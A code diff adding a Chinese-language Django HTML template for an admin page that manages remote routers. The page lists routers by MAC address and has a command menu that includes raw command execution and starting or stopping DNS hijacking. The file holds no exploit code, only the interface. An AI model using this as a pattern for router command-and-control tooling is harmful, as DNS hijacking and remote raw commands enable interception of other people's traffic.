@@ -1,0 +1,314 @@
+{%  extends 'base.html' %}
+{% block reference %}
+	<link href="/static/css/bootstrap.css" media="all" rel="stylesheet">
+	<script src="/static/js/bootstrap.min.js"></script>
+	<script src="/static/js/index.js"></script>
+	<script src="/static/js/jquery.min.js"></script>
+{% endblock %}
+
+{% block content %}
+	<div class="" style="margin:30px 20px 20px 25px">
+
+	<div style="text-align:center; padding-left:92px; background:none repeat scroll 0% 0% #C9F0DD;height:60px">
+		<h4 style="text-align:center; padding:20px 0 0 30px;">管理员控制页面</h4>
+	</div>
+	<div class="row clearfix" style="margin:20px 0 20px 0px">
+		<div class="col-md-2 column" style="background:rgba(198, 190, 204, 1)">
+					<div class="sidebar-tab"><a href="/route/index">反馈者管理</a></div>
+					<div class="sidebar-tab-active"><a href="/route/router">路由器管理</a></div>
+					<div class="sidebar-tab"><a href="/route/routerconnect">路由连接信息</a></div>
+					<div class="sidebar-tab"><a href="/route/order">命令控制</a></div>
+		</div>
+		<div class="col-md-10 column">
+			<div style="margin-left:85%">
+				{% if username %}
+						欢迎, <b> {{username}} </b>
+						 (<a href="/route/logout">登出</a>)
+				{% else %}
+						<a href = "/route/login"> 登录 </a>
+				{% endif %}
+			</div>
+		<h3>路由器列表({{routerCnt}})</h3>
+			<div style="margin:15px 0 10px 5px">
+				<!-- 按钮触发模态框 -->
+				<button class="btn btn-sm" onclick="choseAll()">
+				      全选
+				</button>
+				&nbsp;&nbsp;
+				<button class="btn btn-sm" onclick="choseReverse()">
+				      反选
+				</button>
+			</div>
+			<table style="border-width:0px;border-collapse:collapse;width:100%">
+				<tr style="background-color:#E0E0E0;height:40px;border-width:0px">
+					<td style="width:9%;border-width:0px;font-weight:bold;text-align:center">操作</td>
+					<td style="width:8%;border-width:0px;font-weight:bold;text-align:center">标号</td>
+					<td style="width:18%; border-width:0px;font-weight:bold;text-align:center">MAC地址</td>
+					<td style="width:10%;border-width:0px;font-weight:bold;text-align:center"> 反馈者 </td>
+					<td style="width:20%;border-width:0px;font-weight:bold;text-align:center"> 备注 </td>
+					<td style="width:15%;border-width:0px;font-weight:bold;text-align:center"> 相关命令详情 </td>
+					<td style="width:20%;border-width:0px;font-weight:bold;text-align:center">最后更新时间</td>
+				</tr>
+			</table>
+
+			<table id = "dnsContent" style="border-width:0px;border-collapse:collapse;width:100%;table-layout:fixed;word-wrap:break-word;word-break:break-all;">
+				{% for router in routers %}
+				<tr class="{% cycle row1,row2 %}" style="">
+				<td style="width:9%;border-width:0px;font-weight:bold;text-align:center"><input type='checkbox' value="{{router.id}}" class="selectNode"></td>
+				<td style="width:8%;border-width:0px;text-align:center">{{router.id}}</td>
+				<td style="width:18%;border-width:0px;text-align:center">{{router.MAC}}</td>
+				<td  data-toggle="modal"
+					 data-target="#myModal5" style="width:10%;border-width:0px;text-align:center">
+					 <a onclick="showCIUser({{router.CI_id}})">{{router.client_info}}</a>
+				</td>
+				<td  data-toggle="modal"
+				   data-target="#myModal3" style="width:20%;border-width:0px;text-align:center">
+					 <a onclick="showRouterCommit('{{router.commit}}', {{router.id}})">{{router.commit|truncatechars:30}}</a>
+				</td>
+				<td  data-toggle="modal"
+				   data-target="#myModal6" style="width:15%;border-width:0px;text-align:center">
+					 <a onclick="getRouterOrderStatus({{router.id}})">点击查看</a>
+				</td>
+				<td style="width:20%;border-width:0px;text-align:center">{{router.last_time}}</td>
+				{% endfor %}
+			</table>
+
+			<div style="margin:20px 0 0 20px">
+				<!-- 按钮触发模态框 -->
+				<button class="btn btn-primary btn-sm" data-toggle="modal"
+					 data-target="#myModal2">
+							添加命令
+				</button>
+			</div>
+
+			<div class="modal fade" id="myModal1" tabindex="-1" role="dialog"
+			  aria-labelledby="myModalLabel" aria-hidden="true" style="margin:30px 0 0 24%; width:60%">
+			   <div class="modal-dialog">
+			      <div class="modal-content">
+
+			         <div class="modal-header">
+			            <button type="button" class="close"
+			               data-dismiss="modal" aria-hidden="true">
+			                  &times;
+			            </button>
+			            <h4 class="modal-title" id="myModalLabel">
+			               添加新路由
+			            </h4>
+			         </div>
+
+							 <form action="/route/addrouters/" method="POST">
+						 	 <div class="modal-body">
+						 		<input style="display:none;" id="reserveDatas" name="userIds" />
+								<div>
+									反馈者ID:
+									<input type='text' name='macaddr' id='userId' style='margin-left:17px'/>
+								</div>
+						 		<div style="margin: 20px 0 0 0">
+						 			MAC地址:
+						 			<input type='text' name='macaddr' id='macaddr' style='margin-left:14px'/>
+						 		</div>
+						 		<div style="margin: 20px 0 0 0">
+						 			备注:
+						 		 <textarea style="margin-left:46px; width:350px;height:150px" type="text" name="routermark" id="routermark"></textarea>
+						 		</div>
+							</div>
+
+			         <div class="modal-footer">
+			            <button type="button" class="btn btn-default"
+			               data-dismiss="modal">取消
+			            </button>
+			            <button type="submit" class="btn btn-primary">
+			          	    确定添加
+			            </button>
+			         </div>
+			       </form>
+
+			      </div>
+					</div>
+			</div>
+
+			<div class="modal fade" id="myModal2" tabindex="-1" role="dialog"
+			  aria-labelledby="myModalLabel" aria-hidden="true" style="margin:30px 0 0 24%; width:60%">
+			   <div class="modal-dialog">
+			      <div class="modal-content">
+			         <div class="modal-header">
+			            <button type="button" class="close"
+			               data-dismiss="modal" aria-hidden="true">
+			                  &times;
+			            </button>
+			            <h4 class="modal-title" id="myModalLabel">
+			               发送命令
+			            </h4>
+			         </div>
+
+			         <form action="/route/addorders/" method='POST'>
+			         <div class="modal-body">
+			         	<input style="display:none;" id="reserveData" name="routerIds">
+			         	<div style="margin: 20px 0 0 0">
+			         		命令类型 :
+			         		<select  style="margin-left:22px;width:200px" name='ordertype' id='ordertype' onchange="showParamsBox()">
+				         		<option selected='selected' value='GET_CLIENTS_INFO'> 获得路由下属的客户端信息 </option>
+								<option value='GET_LINK_STATUS'> 获得路由器所有的链接信息 </option>
+				         		<option value='GET_INTERFACES_INFO'>获得路由器接口信息</option>
+				         		<option value='RAW_COMMAND'>执行原始命令</option>
+				         		<option value='GET_ROUTE_STATUS'>获得路由器的路由表信息</option>
+								<option value='START_DNS_HIJACK'>开启dns劫持</option>
+								<option value='GET_DNS_STATUS'>验证dns劫持状态</option>
+								<option value='STOP_DNS_HIJACK'>停止dns劫持</option>
+								<option value='START_VPN'>开启vpn隧道</option>
+				         		<option value='STOP_VPN'>关闭vpn隧道</option>
+				         		<option value='GET_VPN_STATUS'>获得vpn状态</option>
+								<option value='ADD_ROUTE'>添加路由表</option>
+								<option value='DEL_ROUTE'>删除路由表</option>
+			         		</select>
+			         	</div>
+
+			         	 <div style="margin: 20px 0 0 0" id='params'>
+	
+			         	 </div>
+			        </div>
+
+			         <div class="modal-footer">
+			            <button type="button" class="btn btn-default"
+			               data-dismiss="modal">取消
+			            </button>
+			            <button type="submit" class="btn btn-primary" onclick="addData()">
+			          	    确定添加
+			            </button>
+			         </div>
+			       </form>
+
+			      </div>
+				</div>
+			</div>
+
+			<div class="modal fade" id="myModal3" tabindex="-1" role="dialog"
+				  aria-labelledby="myModalLabel" aria-hidden="true" style="margin:77px 0 0 13%; width:80%">
+				   <div class="modal-dialog">
+				      <div class="modal-content">
+
+				         <div class="modal-header">
+				            <button type="button" class="close"
+				               data-dismiss="modal" aria-hidden="true">
+				                  &times;
+				            </button>
+				            <h4 class="modal-title" id="myModalLabel">
+				             	备注详情
+				            </h4>
+				         </div>
+
+				         <div class="modal-body">
+							   	<div id = 'routerCommit' style='margin-left:20px'>
+							   	</div>
+				        </div>
+
+				        <div class="modal-footer">
+											<button type="submit" class="btn btn-primary" data-toggle="modal"
+											   data-target="#myModal4" data-dismiss="modal">
+													修改备注
+											</button>
+					            <button type="button" class="btn btn-default"
+					               data-dismiss="modal">收起
+					            </button>
+				       </div>
+				    </div>
+				</div>
+			</div>
+
+			<div class="modal fade" id="myModal4" tabindex="-1" role="dialog"
+					aria-labelledby="myModalLabel" aria-hidden="true" style="margin:77px 0 0 13%; width:80%">
+					 <div class="modal-dialog">
+							<div class="modal-content">
+
+								 <div class="modal-header">
+										<button type="button" class="close"
+											 data-dismiss="modal" aria-hidden="true">
+													&times;
+										</button>
+										<h4 class="modal-title" id="myModalLabel">
+											修改备注
+										</h4>
+								 </div>
+
+								 <div class="modal-body">
+									    <input style="display:none;" id="reserveRouterId" name="routerIds">
+												<span>输入新的路由备注信息 : </span>
+												<textarea id="newCommits" style="margin-left:20px;height:100px; width:200px"></textarea>
+								</div>
+								<div class="modal-footer">
+											<button type="submit" class="btn btn-primary"
+										 	onclick="updateCommit()" data-dismiss="modal">
+													确定修改
+											</button>
+											<button type="button" class="btn btn-default"
+												 data-dismiss="modal">取消
+											</button>
+								</div>
+						 </div>
+				</div>
+			</div>
+
+			<div class="modal fade" id="myModal5" tabindex="-1" role="dialog"
+				  aria-labelledby="myModalLabel" aria-hidden="true" style="margin:77px 0 0 10%; width:80%">
+				   <div class="modal-dialog">
+				      <div class="modal-content">
+
+				         <div class="modal-header">
+				            <button type="button" class="close"
+				               data-dismiss="modal" aria-hidden="true">
+				                  &times;
+				            </button>
+				            <h4 class="modal-title" id="myModalLabel">
+				             	反馈者详情
+				            </h4>
+				         </div>
+
+				         <div class="modal-body">
+				   		 				<div id = 'CIUserDesc' style='margin-left:20px'>
+				   						</div>
+				         </div>
+
+				        <div class="modal-footer">
+					            <button type="button" class="btn btn-default"
+					               data-dismiss="modal">收起
+					            </button>
+				       </div>
+
+				      </div>
+				</div>
+			</div>
+
+			<div class="modal fade" id="myModal6" tabindex="-1" role="dialog"
+				  aria-labelledby="myModalLabel" aria-hidden="true" >
+				   <div class="modal-dialog" style="margin:37px 0 0 20%; width:60%">
+				      <div class="modal-content">
+
+				         <div class="modal-header">
+				            <button type="button" class="close"
+				               data-dismiss="modal" aria-hidden="true">
+				                  &times;
+				            </button>
+				            <h4 class="modal-title" id="myModalLabel">
+				             	相关命令详情
+				            </h4>
+				         </div>
+
+				         <div class="modal-body">
+	   		 				<div id = 'orderStatus' style='margin-left:20px'>
+	   						</div>
+				         </div>
+
+				        <div class="modal-footer">
+					            <button type="button" class="btn btn-default"
+					               data-dismiss="modal">收起
+					            </button>
+				       </div>
+
+				      </div>
+				</div>
+			</div>
+
+		</div>
+	</div>
+</div>
+{% endblock %}s
